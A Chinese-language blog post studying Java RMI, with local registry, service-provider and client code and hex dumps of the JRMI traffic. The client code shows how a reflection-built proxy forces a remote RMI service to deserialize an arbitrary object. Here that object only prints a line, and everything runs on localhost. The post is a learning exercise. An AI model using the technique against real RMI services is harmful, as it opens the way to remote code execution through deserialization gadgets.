---
title: JAVA JNDI / RMI 学习
date: 2020-02-04 22:39:58
tags: [java, web]
---

RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.

<!--more-->

## RMI

### 反序列化

盗一张图  

![1.png](https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png)

加上一些示例,  

RMIServer.java
```java
package demo.rmb122;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");

        while (true) {
            Thread.sleep(10000);
        }
    }
}
```

RMIServiceProvider.java
```java
package demo.rmb122;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServiceProvider {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);

        TestObjectImpl obj = new TestObjectImpl();
        TestObject services = (TestObject) UnicastRemoteObject.exportObject(obj, 0);
        registry.bind("test", services);
    }
}
```

RMIClient.java
```java
package demo.rmb122;

import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
        DeserializeObject deserializeObject = new DeserializeObject();


        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(new Class[]{Class.class, Map.class});
        constructor.setAccessible(true);

        HashMap hashMap = new HashMap();
        hashMap.put("aaa", deserializeObject);
        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Deprecated.class, hashMap);

        TestObject services = (TestObject) registry.lookup("test");
        CharSequence proxy = (CharSequence) Proxy.newProxyInstance(String.class.getClassLoader(), String.class.getInterfaces(), obj);
        services.callMe(proxy);
    }
}
```

```java
package demo.rmb122;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface TestObject extends Remote {
    void callMe(Dummy input) throws RemoteException;
}

package demo.rmb122;

public class TestObjectImpl implements TestObject {
    @Override
    public void callMe(Dummy input) {
        System.out.println("callMe: " + input);
    }
}

package demo.rmb122;

public class DummyImpl implements Dummy {

}

package demo.rmb122;

public interface Dummy {
}

package demo.rmb122;

import java.io.ObjectInputStream;
import java.io.Serializable;

public class DeserializeObject implements Serializable {
    private void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();
        System.out.println("DeserializeObject.readObject");
    }
}
```

结果如下:  

RMIServiceProvider 输出:  
![2.png](https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png)

大致理解起来还是不太困难的, 客户端通过 `Registry`, 调用 `RMIServiceProvider` 上的服务.  
可以看看 wireshark 的流量, 更清晰一些.  

Client &lt;-&gt; Registry 之间的流量, 缩进的是注册局发给客户端的
```
00000000  4a 52 4d 49 00 02 4b                               JRMI..K
    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 84 58   N..127.0 .0.1...X
00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....
00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w". ........
00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
00000036  02 44 15 4d c9 d4 e6 3b  df 74 00 04 74 65 73 74   .D.M...; .t..test
    00000010  51 ac ed 00 05 77 0f 01  e8 1f e8 41 00 00 01 70   Q....w.. ...A...p
    00000020  5d a3 bd 51 80 0c 73 7d  00 00 00 01 00 16 64 65   ]..Q..s} ......de
    00000030  6d 6f 2e 72 6d 62 31 32  32 2e 54 65 73 74 4f 62   mo.rmb12 2.TestOb
    00000040  6a 65 63 74 70 78 72 00  17 6a 61 76 61 2e 6c 61   jectpxr. .java.la
    00000050  6e 67 2e 72 65 66 6c 65  63 74 2e 50 72 6f 78 79   ng.refle ct.Proxy
    00000060  e1 27 da 20 cc 10 43 cb  02 00 01 4c 00 01 68 74   .'. ..C. ...L..ht
    00000070  00 25 4c 6a 61 76 61 2f  6c 61 6e 67 2f 72 65 66   .%Ljava/ lang/ref
    00000080  6c 65 63 74 2f 49 6e 76  6f 63 61 74 69 6f 6e 48   lect/Inv ocationH
    00000090  61 6e 64 6c 65 72 3b 70  78 70 73 72 00 2d 6a 61   andler;p xpsr.-ja
    000000A0  76 61 2e 72 6d 69 2e 73  65 72 76 65 72 2e 52 65   va.rmi.s erver.Re
    000000B0  6d 6f 74 65 4f 62 6a 65  63 74 49 6e 76 6f 63 61   moteObje ctInvoca
    000000C0  74 69 6f 6e 48 61 6e 64  6c 65 72 00 00 00 00 00   tionHand ler.....
    000000D0  00 00 02 02 00 00 70 78  72 00 1c 6a 61 76 61 2e   ......px r..java.
    000000E0  72 6d 69 2e 73 65 72 76  65 72 2e 52 65 6d 6f 74   rmi.serv er.Remot
    000000F0  65 4f 62 6a 65 63 74 d3  61 b4 91 0c 61 33 1e 03   eObject. a...a3..
    00000100  00 00 70 78 70 77 32 00  0a 55 6e 69 63 61 73 74   ..pxpw2. .Unicast
    00000110  52 65 66 00 09 31 32 37  2e 30 2e 31 2e 31 00 00   Ref..127 .0.1.1..
    00000120  a9 83 27 2e 2f a2 08 49  09 8f ab a0 76 97 00 00   ..'./..I ....v...
    00000130  01 70 5d a6 5c 22 80 01  01 78                     .p].\".. .x
00000046  52                                                 R
    0000013A  53                                                 S
00000047  54 e8 1f e8 41 00 00 01  70 5d a3 bd 51 80 0c      T...A... p]..Q..
```

Client &lt;-&gt; RMIServiceProvider 之间的流量, 缩进的是服务提供者发给客户端的
```
00000000  4a 52 4d 49 00 02 4b                               JRMI..K
    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c1 c2   N..127.0 .0.1....
00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....
00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w". ........
00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
00000036  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj
00000046  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O
00000056  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...
00000066  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.
00000076  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID
00000086  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob
00000096  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L
000000A6  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java/rmi /server/
000000B6  55 49 44 3b 70 78 70 27  2e 2f a2 08 49 09 8f 73   UID;pxp' ./..I..s
000000C6  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv
000000D6  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...
000000E6  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time
000000F6  49 00 06 75 6e 69 71 75  65 70 78 70 80 01 00 00   I..uniqu epxp....
00000106  01 70 5d a6 5c 22 ab a0  76 97 77 08 80 00 00 00   .p].\".. v.w.....
00000116  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi
00000126  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J
00000136  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..
00000146  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java/rmi
00000156  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   /dgc/VMI D;pxp...
00000166  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...'.sr. .java.rm
00000176  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...
00000186  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[
00000196  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu
000001A6  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....
000001B6  70 78 70 00 00 00 08 f7  88 3b 04 59 fc a2 27 73   pxp..... .;.Y..'s
000001C6  71 00 7e 00 05 80 01 00  00 01 70 5d aa ea e5 dd   q.~..... ..p]....
000001D6  bd ea 1a                                           ...
    00000010  51 ac ed 00 05 77 0f 01  ab a0 76 97 00 00 01 70   Q....w.. ..v....p
    00000020  5d a6 5c 22 80 05 73 72  00 12 6a 61 76 61 2e 72   ].\"..sr ..java.r
    00000030  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f
    00000040  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL
    00000050  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava/r
    00000060  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi/dgc/V MID;pxp.
    00000070  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....'.s r..java.
    00000080  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.
    00000090  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.
    000000A0  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav
    000000B0  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a/rmi/se rver/UID
    000000C0  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......
    000000D0  54 e0 02 00 00 70 78 70  00 00 00 08 f7 88 3b 04   T....pxp ......;.
    000000E0  59 fc a2 27 73 72 00 13  6a 61 76 61 2e 72 6d 69   Y..'sr.. java.rmi
    000000F0  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..
    00000100  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.
    00000110  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx
    00000120  70 80 01 00 00 01 70 5d  aa ea e5 dd bd ea 1a      p.....p] .......
000001D9  52                                                 R
    0000012F  53                                                 S
000001DA  50 ac ed 00 05 77 22 27  2e 2f a2 08 49 09 8f ab   P....w"' ./..I...
000001EA  a0 76 97 00 00 01 70 5d  a6 5c 22 80 01 ff ff ff   .v....p] .\".....
000001FA  ff d9 0d 2f 12 e0 71 7f  42 73 7d 00 00 00 01 00   .../..q. Bs}.....
0000020A  11 64 65 6d 6f 2e 72 6d  62 31 32 32 2e 44 75 6d   .demo.rm b122.Dum
0000021A  6d 79 70 78 72 00 17 6a  61 76 61 2e 6c 61 6e 67   mypxr..j ava.lang
0000022A  2e 72 65 66 6c 65 63 74  2e 50 72 6f 78 79 e1 27   .reflect .Proxy.'
0000023A  da 20 cc 10 43 cb 02 00  01 4c 00 01 68 74 00 25   . ..C... .L..ht.%
0000024A  4c 6a 61 76 61 2f 6c 61  6e 67 2f 72 65 66 6c 65   Ljava/la ng/refle
0000025A  63 74 2f 49 6e 76 6f 63  61 74 69 6f 6e 48 61 6e   ct/Invoc ationHan
0000026A  64 6c 65 72 3b 70 78 70  73 72 00 32 73 75 6e 2e   dler;pxp sr.2sun.
0000027A  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati
0000028A  6f 6e 2e 41 6e 6e 6f 74  61 74 69 6f 6e 49 6e 76   on.Annot ationInv
0000029A  6f 63 61 74 69 6f 6e 48  61 6e 64 6c 65 72 55 ca   ocationH andlerU.
000002AA  f5 0f 15 cb 7e a5 02 00  02 4c 00 0c 6d 65 6d 62   ....~... .L..memb
000002BA  65 72 56 61 6c 75 65 73  74 00 0f 4c 6a 61 76 61   erValues t..Ljava
000002CA  2f 75 74 69 6c 2f 4d 61  70 3b 4c 00 04 74 79 70   /util/Ma p;L..typ
000002DA  65 74 00 11 4c 6a 61 76  61 2f 6c 61 6e 67 2f 43   et..Ljav a/lang/C
000002EA  6c 61 73 73 3b 70 78 70  73 72 00 11 6a 61 76 61   lass;pxp sr..java
000002FA  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da   .util.Ha shMap...
0000030A  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46   ...`.... F..loadF
0000031A  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c   actorI.. threshol
0000032A  64 70 78 70 3f 40 00 00  00 00 00 0c 77 08 00 00   dpxp?@.. ....w...
0000033A  00 10 00 00 00 01 74 00  03 61 61 61 73 72 00 1d   ......t. .aaasr..
0000034A  64 65 6d 6f 2e 72 6d 62  31 32 32 2e 44 65 73 65   demo.rmb 122.Dese
0000035A  72 69 61 6c 69 7a 65 4f  62 6a 65 63 74 e7 b9 28   rializeO bject..(
0000036A  12 38 24 61 0c 02 00 00  70 78 70 78 76 72 00 14   .8$a.... pxpxvr..
0000037A  6a 61 76 61 2e 6c 61 6e  67 2e 44 65 70 72 65 63   java.lan g.Deprec
0000038A  61 74 65 64 00 00 00 00  00 00 00 00 00 00 00 70   ated.... .......p
0000039A  78 70                                              xp
    00000130  51 ac ed 00 05 77 0f 02  ab a0 76 97 00 00 01 70   Q....w.. ..v....p
    00000140  5d a6 5c 22 80 06 73 72  00 1e 6a 61 76 61 2e 6c   ].\"..sr ..java.l
    00000150  61 6e 67 2e 4e 75 6c 6c  50 6f 69 6e 74 65 72 45   ang.Null PointerE
    00000160  78 63 65 70 74 69 6f 6e  47 a5 a1 8e ff 31 e1 b8   xception G....1..
    00000170  02 00 00 70 78 72 00 1a  6a 61 76 61 2e 6c 61 6e   ...pxr.. java.lan
    00000180  67 2e 52 75 6e 74 69 6d  65 45 78 63 65 70 74 69   g.Runtim eExcepti
    00000190  6f 6e 9e 5f 06 47 0a 34  83 e5 02 00 00 70 78 72   on._.G.4 .....pxr
    000001A0  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 45 78 63 65   ..java.l ang.Exce
    000001B0  70 74 69 6f 6e d0 fd 1f  3e 1a 3b 1c c4 02 00 00   ption... >.;.....
    000001C0  70 78 72 00 13 6a 61 76  61 2e 6c 61 6e 67 2e 54   pxr..jav a.lang.T
    000001D0  68 72 6f 77 61 62 6c 65  d5 c6 35 27 39 77 b8 cb   hrowable ..5'9w..
    000001E0  03 00 04 4c 00 05 63 61  75 73 65 74 00 15 4c 6a   ...L..ca uset..Lj
    000001F0  61 76 61 2f 6c 61 6e 67  2f 54 68 72 6f 77 61 62   ava/lang /Throwab
    00000200  6c 65 3b 4c 00 0d 64 65  74 61 69 6c 4d 65 73 73   le;L..de tailMess
    00000210  61 67 65 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67   aget..Lj ava/lang
    00000220  2f 53 74 72 69 6e 67 3b  5b 00 0a 73 74 61 63 6b   /String; [..stack
    00000230  54 72 61 63 65 74 00 1e  5b 4c 6a 61 76 61 2f 6c   Tracet.. [Ljava/l
    00000240  61 6e 67 2f 53 74 61 63  6b 54 72 61 63 65 45 6c   ang/Stac kTraceEl
    00000250  65 6d 65 6e 74 3b 4c 00  14 73 75 70 70 72 65 73   ement;L. .suppres
    00000260  73 65 64 45 78 63 65 70  74 69 6f 6e 73 74 00 10   sedExcep tionst..
    00000270  4c 6a 61 76 61 2f 75 74  69 6c 2f 4c 69 73 74 3b   Ljava/ut il/List;
    00000280  70 78 70 71 00 7e 00 08  70 75 72 00 1e 5b 4c 6a   pxpq.~.. pur..[Lj
    00000290  61 76 61 2e 6c 61 6e 67  2e 53 74 61 63 6b 54 72   ava.lang .StackTr
    000002A0  61 63 65 45 6c 65 6d 65  6e 74 3b 02 46 2a 3c 3c   aceEleme nt;.F*<<
    000002B0  fd 22 39 02 00 00 70 78  70 00 00 00 17 73 72 00   ."9...px p....sr.
    000002C0  1b 6a 61 76 61 2e 6c 61  6e 67 2e 53 74 61 63 6b   .java.la ng.Stack
    000002D0  54 72 61 63 65 45 6c 65  6d 65 6e 74 61 09 c5 9a   TraceEle menta...
    000002E0  26 36 dd 85 02 00 08 42  00 06 66 6f 72 6d 61 74   &6.....B ..format
    000002F0  49 00 0a 6c 69 6e 65 4e  75 6d 62 65 72 4c 00 0f   I..lineN umberL..
    00000300  63 6c 61 73 73 4c 6f 61  64 65 72 4e 61 6d 65 71   classLoa derNameq
    00000310  00 7e 00 05 4c 00 0e 64  65 63 6c 61 72 69 6e 67   .~..L..d eclaring
    00000320  43 6c 61 73 73 71 00 7e  00 05 4c 00 08 66 69 6c   Classq.~ ..L..fil
    00000330  65 4e 61 6d 65 71 00 7e  00 05 4c 00 0a 6d 65 74   eNameq.~ ..L..met
    00000340  68 6f 64 4e 61 6d 65 71  00 7e 00 05 4c 00 0a 6d   hodNameq .~..L..m
    00000350  6f 64 75 6c 65 4e 61 6d  65 71 00 7e 00 05 4c 00   oduleNam eq.~..L.
    00000360  0d 6d 6f 64 75 6c 65 56  65 72 73 69 6f 6e 71 00   .moduleV ersionq.
    00000370  7e 00 05 70 78 70 02 00  00 00 a6 70 74 00 32 73   ~..pxp.. ...pt.2s
    00000380  75 6e 2e 72 65 66 6c 65  63 74 2e 61 6e 6e 6f 74   un.refle ct.annot
    00000390  61 74 69 6f 6e 2e 41 6e  6e 6f 74 61 74 69 6f 6e   ation.An notation
    000003A0  49 6e 76 6f 63 61 74 69  6f 6e 48 61 6e 64 6c 65   Invocati onHandle
    000003B0  72 74 00 20 41 6e 6e 6f  74 61 74 69 6f 6e 49 6e   rt. Anno tationIn
    000003C0  76 6f 63 61 74 69 6f 6e  48 61 6e 64 6c 65 72 2e   vocation Handler.
    000003D0  6a 61 76 61 74 00 13 6d  65 6d 62 65 72 56 61 6c   javat..m emberVal
    000003E0  75 65 54 6f 53 74 72 69  6e 67 74 00 09 6a 61 76   ueToStri ngt..jav
    000003F0  61 2e 62 61 73 65 74 00  06 31 31 2e 30 2e 36 73   a.baset. .11.0.6s
    00000400  71 00 7e 00 0b 02 00 00  00 9c 70 71 00 7e 00 0d   q.~..... ..pq.~..
    00000410  71 00 7e 00 0e 74 00 0c  74 6f 53 74 72 69 6e 67   q.~..t.. toString
    00000420  49 6d 70 6c 71 00 7e 00  10 71 00 7e 00 11 73 71   Implq.~. .q.~..sq
    00000430  00 7e 00 0b 02 00 00 00  48 70 71 00 7e 00 0d 71   .~...... Hpq.~..q
    00000440  00 7e 00 0e 74 00 06 69  6e 76 6f 6b 65 71 00 7e   .~..t..i nvokeq.~
    00000450  00 10 71 00 7e 00 11 73  71 00 7e 00 0b 01 ff ff   ..q.~..s q.~.....
    00000460  ff ff 74 00 03 61 70 70  74 00 15 63 6f 6d 2e 73   ..t..app t..com.s
    00000470  75 6e 2e 70 72 6f 78 79  2e 24 50 72 6f 78 79 31   un.proxy .$Proxy1
    00000480  70 74 00 08 74 6f 53 74  72 69 6e 67 70 70 73 71   pt..toSt ringppsq
    00000490  00 7e 00 0b 02 00 00 0b  87 70 74 00 10 6a 61 76   .~...... .pt..jav
    000004A0  61 2e 6c 61 6e 67 2e 53  74 72 69 6e 67 74 00 0b   a.lang.S tringt..
    000004B0  53 74 72 69 6e 67 2e 6a  61 76 61 74 00 07 76 61   String.j avat..va
    000004C0  6c 75 65 4f 66 71 00 7e  00 10 71 00 7e 00 11 73   lueOfq.~ ..q.~..s
    000004D0  71 00 7e 00 0b 01 00 00  00 06 71 00 7e 00 17 74   q.~..... ..q.~..t
    000004E0  00 1a 64 65 6d 6f 2e 72  6d 62 31 32 32 2e 54 65   ..demo.r mb122.Te
    000004F0  73 74 4f 62 6a 65 63 74  49 6d 70 6c 74 00 13 54   stObject Implt..T
    00000500  65 73 74 4f 62 6a 65 63  74 49 6d 70 6c 2e 6a 61   estObjec tImpl.ja
    00000510  76 61 74 00 06 63 61 6c  6c 4d 65 70 70 73 71 00   vat..cal lMeppsq.
    00000520  7e 00 0b 02 ff ff ff fe  70 74 00 2d 6a 64 6b 2e   ~....... pt.-jdk.
    00000530  69 6e 74 65 72 6e 61 6c  2e 72 65 66 6c 65 63 74   internal .reflect
    00000540  2e 4e 61 74 69 76 65 4d  65 74 68 6f 64 41 63 63   .NativeM ethodAcc
    00000550  65 73 73 6f 72 49 6d 70  6c 74 00 1d 4e 61 74 69   essorImp lt..Nati
    00000560  76 65 4d 65 74 68 6f 64  41 63 63 65 73 73 6f 72   veMethod Accessor
    00000570  49 6d 70 6c 2e 6a 61 76  61 74 00 07 69 6e 76 6f   Impl.jav at..invo
    00000580  6b 65 30 71 00 7e 00 10  71 00 7e 00 11 73 71 00   ke0q.~.. q.~..sq.
    00000590  7e 00 0b 02 00 00 00 3e  70 71 00 7e 00 23 71 00   ~......> pq.~.#q.
    000005A0  7e 00 24 71 00 7e 00 15  71 00 7e 00 10 71 00 7e   ~.$q.~.. q.~..q.~
    000005B0  00 11 73 71 00 7e 00 0b  02 00 00 00 2b 70 74 00   ..sq.~.. ....+pt.
    000005C0  31 6a 64 6b 2e 69 6e 74  65 72 6e 61 6c 2e 72 65   1jdk.int ernal.re
    000005D0  66 6c 65 63 74 2e 44 65  6c 65 67 61 74 69 6e 67   flect.De legating
    000005E0  4d 65 74 68 6f 64 41 63  63 65 73 73 6f 72 49 6d   MethodAc cessorIm
    000005F0  70 6c 74 00 21 44 65 6c  65 67 61 74 69 6e 67 4d   plt.!Del egatingM
    00000600  65 74 68 6f 64 41 63 63  65 73 73 6f 72 49 6d 70   ethodAcc essorImp
    00000610  6c 2e 6a 61 76 61 71 00  7e 00 15 71 00 7e 00 10   l.javaq. ~..q.~..
    00000620  71 00 7e 00 11 73 71 00  7e 00 0b 02 00 00 02 36   q.~..sq. ~......6
    00000630  70 74 00 18 6a 61 76 61  2e 6c 61 6e 67 2e 72 65   pt..java .lang.re
    00000640  66 6c 65 63 74 2e 4d 65  74 68 6f 64 74 00 0b 4d   flect.Me thodt..M
    00000650  65 74 68 6f 64 2e 6a 61  76 61 71 00 7e 00 15 71   ethod.ja vaq.~..q
    00000660  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...
    00000670  00 00 01 67 70 74 00 1f  73 75 6e 2e 72 6d 69 2e   ...gpt.. sun.rmi.
    00000680  73 65 72 76 65 72 2e 55  6e 69 63 61 73 74 53 65   server.U nicastSe
    00000690  72 76 65 72 52 65 66 74  00 15 55 6e 69 63 61 73   rverReft ..Unicas
    000006A0  74 53 65 72 76 65 72 52  65 66 2e 6a 61 76 61 74   tServerR ef.javat
    000006B0  00 08 64 69 73 70 61 74  63 68 74 00 08 6a 61 76   ..dispat cht..jav
    000006C0  61 2e 72 6d 69 71 00 7e  00 11 73 71 00 7e 00 0b   a.rmiq.~ ..sq.~..
    000006D0  02 00 00 00 c8 70 74 00  1d 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi
    000006E0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans
    000006F0  70 6f 72 74 24 31 74 00  0e 54 72 61 6e 73 70 6f   port$1t. .Transpo
    00000700  72 74 2e 6a 61 76 61 74  00 03 72 75 6e 71 00 7e   rt.javat ..runq.~
    00000710  00 31 71 00 7e 00 11 73  71 00 7e 00 0b 02 00 00   .1q.~..s q.~.....
    00000720  00 c5 70 71 00 7e 00 33  71 00 7e 00 34 71 00 7e   ..pq.~.3 q.~.4q.~
    00000730  00 35 71 00 7e 00 31 71  00 7e 00 11 73 71 00 7e   .5q.~.1q .~..sq.~
    00000740  00 0b 02 ff ff ff fe 70  74 00 1e 6a 61 76 61 2e   .......p t..java.
    00000750  73 65 63 75 72 69 74 79  2e 41 63 63 65 73 73 43   security .AccessC
    00000760  6f 6e 74 72 6f 6c 6c 65  72 74 00 15 41 63 63 65   ontrolle rt..Acce
    00000770  73 73 43 6f 6e 74 72 6f  6c 6c 65 72 2e 6a 61 76   ssContro ller.jav
    00000780  61 74 00 0c 64 6f 50 72  69 76 69 6c 65 67 65 64   at..doPr ivileged
    00000790  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..
    000007A0  02 00 00 00 c4 70 74 00  1b 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi
    000007B0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans
    000007C0  70 6f 72 74 71 00 7e 00  34 74 00 0b 73 65 72 76   portq.~. 4t..serv
    000007D0  69 63 65 43 61 6c 6c 71  00 7e 00 31 71 00 7e 00   iceCallq .~.1q.~.
    000007E0  11 73 71 00 7e 00 0b 02  00 00 02 32 70 74 00 22   .sq.~... ...2pt."
    000007F0  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor
    00000800  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo
    00000810  72 74 74 00 11 54 43 50  54 72 61 6e 73 70 6f 72   rtt..TCP Transpor
    00000820  74 2e 6a 61 76 61 74 00  0e 68 61 6e 64 6c 65 4d   t.javat. .handleM
    00000830  65 73 73 61 67 65 73 71  00 7e 00 31 71 00 7e 00   essagesq .~.1q.~.
    00000840  11 73 71 00 7e 00 0b 02  00 00 03 1c 70 74 00 34   .sq.~... ....pt.4
    00000850  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor
    00000860  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo
    00000870  72 74 24 43 6f 6e 6e 65  63 74 69 6f 6e 48 61 6e   rt$Conne ctionHan
    00000880  64 6c 65 72 71 00 7e 00  40 74 00 04 72 75 6e 30   dlerq.~. @t..run0
    00000890  71 00 7e 00 31 71 00 7e  00 11 73 71 00 7e 00 0b   q.~.1q.~ ..sq.~..
    000008A0  02 00 00 02 a5 70 71 00  7e 00 43 71 00 7e 00 40   .....pq. ~.Cq.~.@
    000008B0  74 00 0c 6c 61 6d 62 64  61 24 72 75 6e 24 30 71   t..lambd a$run$0q
    000008C0  00 7e 00 31 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~.1q.~. .sq.~...
    000008D0  ff ff ff fe 70 71 00 7e  00 38 71 00 7e 00 39 71   ....pq.~ .8q.~.9q
    000008E0  00 7e 00 3a 71 00 7e 00  10 71 00 7e 00 11 73 71   .~.:q.~. .q.~..sq
    000008F0  00 7e 00 0b 02 00 00 02  a4 70 71 00 7e 00 43 71   .~...... .pq.~.Cq
    00000900  00 7e 00 40 71 00 7e 00  35 71 00 7e 00 31 71 00   .~.@q.~. 5q.~.1q.
    00000910  7e 00 11 73 71 00 7e 00  0b 02 00 00 04 68 70 74   ~..sq.~. .....hpt
    00000920  00 27 6a 61 76 61 2e 75  74 69 6c 2e 63 6f 6e 63   .'java.u til.conc
    00000930  75 72 72 65 6e 74 2e 54  68 72 65 61 64 50 6f 6f   urrent.T hreadPoo
    00000940  6c 45 78 65 63 75 74 6f  72 74 00 17 54 68 72 65   lExecuto rt..Thre
    00000950  61 64 50 6f 6f 6c 45 78  65 63 75 74 6f 72 2e 6a   adPoolEx ecutor.j
    00000960  61 76 61 74 00 09 72 75  6e 57 6f 72 6b 65 72 71   avat..ru nWorkerq
    00000970  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...
    00000980  00 00 02 74 70 74 00 2e  6a 61 76 61 2e 75 74 69   ...tpt.. java.uti
    00000990  6c 2e 63 6f 6e 63 75 72  72 65 6e 74 2e 54 68 72   l.concur rent.Thr
    000009A0  65 61 64 50 6f 6f 6c 45  78 65 63 75 74 6f 72 24   eadPoolE xecutor$
    000009B0  57 6f 72 6b 65 72 71 00  7e 00 4b 71 00 7e 00 35   Workerq. ~.Kq.~.5
    000009C0  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..
    000009D0  02 00 00 03 42 70 74 00  10 6a 61 76 61 2e 6c 61   ....Bpt. .java.la
    000009E0  6e 67 2e 54 68 72 65 61  64 74 00 0b 54 68 72 65   ng.Threa dt..Thre
    000009F0  61 64 2e 6a 61 76 61 71  00 7e 00 35 71 00 7e 00   ad.javaq .~.5q.~.
    00000A00  10 71 00 7e 00 11 73 72  00 1f 6a 61 76 61 2e 75   .q.~..sr ..java.u
    00000A10  74 69 6c 2e 43 6f 6c 6c  65 63 74 69 6f 6e 73 24   til.Coll ections$
    00000A20  45 6d 70 74 79 4c 69 73  74 7a b8 17 b4 3c a7 9e   EmptyLis tz...<..
    00000A30  de 02 00 00 70 78 70 78                            ....pxpx 
```

